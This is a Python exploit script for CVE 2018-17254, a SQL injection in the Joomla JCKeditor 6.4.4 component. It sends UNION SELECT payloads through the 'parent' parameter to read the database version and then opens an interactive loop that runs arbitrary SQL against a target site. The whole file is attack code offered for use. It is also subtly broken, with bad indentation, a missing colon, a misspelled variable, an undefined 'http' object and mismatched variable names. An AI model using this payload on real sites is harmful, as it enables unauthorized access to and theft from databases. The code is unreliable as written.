#! python3

import urllib3
from bs4 import BeautifulSoup

print("="*73)
print("""
	CVE 2018-17254
	Joomla Component JCKeditor 6.4.4 - 'parent' SQL Injection
	Made by: byt3_ver!fy <===> Github: https://github.com/FachrulRH/
""")
print("="*73)
url = input("Insert site: ")

def check():
	path = "/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="
	payload = "%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa"
	req = http.request('GET', url + path + payload)
	scrape = BeautifulSoup(req.data, 'html.parser')
	outputs = scrape.find_all('node')
		for output in outputs:
			o = ouput.get('url')
			if o in scrape:
				print("\033[00;32m[+] Found Database Version: \033[01;32m%s" % o)
				print("\033[00;32m[+] The Website is Vulnerable")
			else:
				print("\033[00;31m[-] The Website not Vulnerable ")
def command()
	while(True):
		sql_command = input("\033[00;31msql_command_1> ")
		sql_command_1 = input("\033[00;31msql_command_2[optional]> ")
		if not sql_command_1:
			payload = "%22%20UNION%20SELECT%20NULL,NULL," + command + ",NULL,NULL,NULL,NULL,NULL--%20aa"
			req = http.request('GET', url + path + payload)
			scrape = BeautifulSoup(req.data, 'html.parser')
			outputs = scrape.find_all('node')
			for output in outputs:
				o = output.get('url')
				print("\033[00;32mOutput is: \033[01:32m\n%s\n" % o)
		elif str(sql_command) and str(sql_command_1):
			payload = "%22%20UNION%20SELECT%20NULL,NULL," + command + ",NULL,NULL,NULL,NULL,NULL " + command_1 +"--%20aa"
			req = http.request('GET', url + path + payload)
			scrape = BeautifulSoup(req.data, 'html.parser')
			outputs = scrape.find_all('node')
			for output in outputs:
				o = output.get('url')
				print("\033[00;32mOutput is: \033[01;32m\n%s\n" % o)
		else:
			quit()
